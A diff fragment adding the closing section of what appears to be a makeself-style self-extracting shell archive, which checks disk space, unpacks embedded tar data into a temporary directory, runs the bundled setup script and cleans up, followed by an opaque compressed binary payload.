+    leftspace=`MS_diskspace "$tmpdir"`
+    if test -n "$leftspace"; then
+        if test "$leftspace" -lt 12; then
+            echo
+            echo "Not enough space left in "`dirname $tmpdir`" ($leftspace KB) to decompress $0 (12 KB)" >&2
+            echo "Use --nodiskspace option to skip this check and proceed anyway" >&2
+            if test x"$keep" = xn; then
+                echo "Consider setting TMPDIR to a directory with more free space."
+            fi
+            eval $finish; exit 1
+        fi
+    fi
+fi
+
+for s in $filesizes
+do
+    if MS_dd_Progress "$0" $offset $s | MS_Decompress | ( cd "$tmpdir"; umask $ORIG_UMASK ; UnTAR xp ) 1>/dev/null; then
+		if test x"$ownership" = xy; then
+			(cd "$tmpdir"; chown -R `id -u` .;  chgrp -R `id -g` .)
+		fi
+    else
+		echo >&2
+		echo "Unable to decompress $0" >&2
+		eval $finish; exit 1
+    fi
+    offset=`expr $offset + $s`
+done
+if test x"$quiet" = xn; then
+	echo
+fi
+
+cd "$tmpdir"
+res=0
+if test x"$script" != x; then
+    if test x"$export_conf" = x"y"; then
+        MS_BUNDLE="$0"
+        MS_LABEL="$label"
+        MS_SCRIPT="$script"
+        MS_SCRIPTARGS="$scriptargs"
+        MS_ARCHDIRNAME="$archdirname"
+        MS_KEEP="$KEEP"
+        MS_NOOVERWRITE="$NOOVERWRITE"
+        MS_COMPRESS="$COMPRESS"
+        MS_CLEANUP="$cleanup"
+        export MS_BUNDLE MS_LABEL MS_SCRIPT MS_SCRIPTARGS
+        export MS_ARCHDIRNAME MS_KEEP MS_NOOVERWRITE MS_COMPRESS
+    fi
+
+    if test x"$verbose" = x"y"; then
+		MS_Printf "OK to execute: $script $scriptargs $* ? [Y/n] "
+		read yn
+		if test x"$yn" = x -o x"$yn" = xy -o x"$yn" = xY; then
+			eval "\"$script\" $scriptargs \"\$@\""; res=$?;
+		fi
+    else
+		eval "\"$script\" $scriptargs \"\$@\""; res=$?
+    fi
+    if test "$res" -ne 0; then
+		test x"$verbose" = xy && echo "The program '$script' returned an error code ($res)" >&2
+    fi
+fi
+
+MS_exec_cleanup
+
+if test x"$keep" = xn; then
+    cd "$TMPROOT"
+    rm -rf "$tmpdir"
+fi
+eval $finish; exit $res
+‹�‘‚=gí–kkÛ0†óÙ¿â4MJBql7	É2ºÑ]zt-Ë
++ŠkÛ¢ºx’Ü$lûï““,—²QíH7=ØÆGÒyÏEVË“¢Ðè"M\-Ã$!QKe•Å7ôºÝòôºþêµ¼
+¿W	:½ ×öƒ=?¨øA·×îTÀ¯ü
+¥Ci\QF½ÆT¨ßØÝ÷þ‰²½å]î]‡*sŒ2Õ®QF˜kÂS(J˜¹©D¥Z­VÕÙ†Ã‚GšZ€ÊÄ¢BJä4ah"Ër'—„ë«Ås£	_0Ä&œPÝ­_ºuæÖc¨ê§ƒú°ê|wÌÌ'<!œ*DîŒ2BÑøQàsˆÅtü¶ù]ŠBB8ó C‰ÐÀ±Yƒâ�¦Ë–
+ÔDidPä¥ÍùÐ™R¸(ÕIüRßŒº¹nŒAQdT&¥5Ôwd4«'ŽD¹LL$FÚX7"ÁXÓW@Hù²¹°5á¡àÞ@¦u®žW`gþòW¯^x1ÞzÜxaÌ¦vÞ¿9?÷ki�wë
+¾‹»ª`æ&Ã07‚þlÉÙœãéœfÊQ(ñ–PŠn:ôý¾Ÿ§fà~‚£·OK'R’hWEÆEÙÒó¨H	oåY~Ç½räC…UQÄöþTÃùÙp)"†jY¼<d¸ÆŒð<Tj$d¼_ûÅê¦Ig^³ªÒ™ÙžÓÎ¥›Ò2Þß(3=`LôÌ!J+HLØ¼¯æ…R‡W,œ”£—ù?öïÊ¿áÙëÓƒáÖæÕAÛ±‰\I¤âbtšA4Y¦1êH)4÷U{cûø_Èß£}ržþvÝ³]ºš7s2D¾Ö¢²wòœn^ƒ>³™[Û_‹4”9-ØZöÆ¬£¢'—¾¾Ý^ÿ£Ó°íÒYâ"ÙúIöUp6¼UíÃ»Ã>†ˆ¶mÑ{[4+‹Åb±X,‹Åb±X,‹eóø÷°õô�(��
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+
+
